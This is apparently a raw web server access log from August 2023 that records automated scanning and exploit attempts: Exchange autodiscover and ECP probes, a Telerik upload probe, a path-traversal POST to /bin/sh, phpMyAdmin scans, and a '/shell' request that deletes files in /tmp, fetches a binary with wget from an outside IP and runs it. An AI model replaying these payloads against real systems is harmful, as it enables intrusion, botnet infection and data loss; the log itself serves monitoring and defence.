91.224.92.110 - - [23/Aug/2023:06:33:17 +0900] "CONNECT api.findip.net:443 HTTP/1.1" 400 157 "-" "-"
185.180.143.140 - - [24/Aug/2023:04:40:54 +0900] "GET /autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.140 - - [24/Aug/2023:04:41:17 +0900] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
113.200.114.42 - - [24/Aug/2023:09:56:18 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
165.227.41.210 - - [24/Aug/2023:16:12:17 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/2.0" 404 4598 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
112.160.164.254 - - [24/Aug/2023:22:19:30 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+185.224.128.151/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
43.225.64.130 - - [26/Aug/2023:17:33:37 +0900] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
43.225.64.130 - - [26/Aug/2023:17:33:37 +0900] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
43.225.64.130 - - [26/Aug/2023:17:33:40 +0900] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
43.225.64.130 - - [26/Aug/2023:17:33:50 +0900] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
43.133.134.155 - - [27/Aug/2023:00:34:10 +0900] "GET /jquery-3.3.1.min.js HTTP/1.1" 404 4611 "http://code.jquery.com/" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
